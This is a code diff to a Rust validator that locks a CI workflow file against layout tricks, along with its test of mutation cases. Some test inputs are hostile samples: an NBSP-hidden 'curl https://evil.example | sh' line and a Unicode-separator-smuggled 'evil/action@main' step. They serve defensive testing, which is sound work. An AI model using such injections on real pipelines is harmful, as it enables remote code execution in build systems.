@@ -72,8 +72,10 @@ jobs:
 fn locked(y: &str) -> Result<(), String> {
     let want = LOCK.replace("{checkout}", &checkout()).replace("{upload}", UPLOAD).replace("{deploy}", DEPLOY);
     // code review 3: every byte is printable ASCII or '\n' before a line is judged, so no other line
-    // break (CR, NEL, LS, PS), tab, BOM or Unicode space can make a line YAML reads differently from
-    // the one this compares; then a blank line is all spaces and a comment line is spaces, then '#'
+    // break (CR, NEL, LS, PS), BOM or Unicode space can make a line YAML reads differently from the
+    // one this compares; then a blank line is all spaces and a comment line is spaces, then '#'. A tab
+    // is refused here only for a clearer error: those two rules already keep a tab line as code, and
+    // the lock fails it as an unlisted line
     if let Some((at, c)) = y.char_indices().find(|&(_, c)| c != '\n' && !(' '..='~').contains(&c)) {
         return Err(format!("byte {at}: {c:?} is not printable ASCII or a newline"));
     }
@@ -112,8 +114,8 @@ fn mutated(after: &str, add: &str, replace: bool) -> String {
         + "\n"
 }
 
-/// Each mutation class code review 2 found passing the line readers is refused by the lock; a comment
-/// at any column, alone, is not.
+/// Each mutation class code reviews 2 and 3 found passing the line readers is refused by the lock; a
+/// comment at any column, alone, is not.
 #[test]
 fn the_lock_refuses_every_layout_the_line_readers_would_misread() {
     let run = r#"      - run: scripts/pages-build.sh "$RUNNER_TEMP/site""#;
@@ -148,8 +150,9 @@ fn the_lock_refuses_every_layout_the_line_readers_would_misread() {
         ("a PS after a comment", mutated("          persist-credentials: false", "      # note\u{2029}      - uses: evil/action@main", false)),
         ("an NBSP-then-# line under build's run", mutated(run, "          \u{a0}#|| curl https://evil.example | sh", false)),
         ("a U+3000 'blank' line in the environment", mutated("      name: github-pages", "        \u{3000}", false)),
-        ("a tab-indented comment", mutated("    timeout-minutes: 15", "\t# note", false)),
-        ("a tab-only line", mutated("    timeout-minutes: 15", "\t", false)),
+        // a tab line is never blank or a comment to the lock, so these hold whatever the byte rule says of tabs
+        ("a tab-indented comment, kept as code", mutated("    timeout-minutes: 15", "\t# note", false)),
+        ("a tab-only line, kept as code", mutated("    timeout-minutes: 15", "\t", false)),
         ("a BOM", format!("\u{feff}{}", yml())),
         ("CRLF line ends", yml().replace('\n', "\r\n")),
     ];
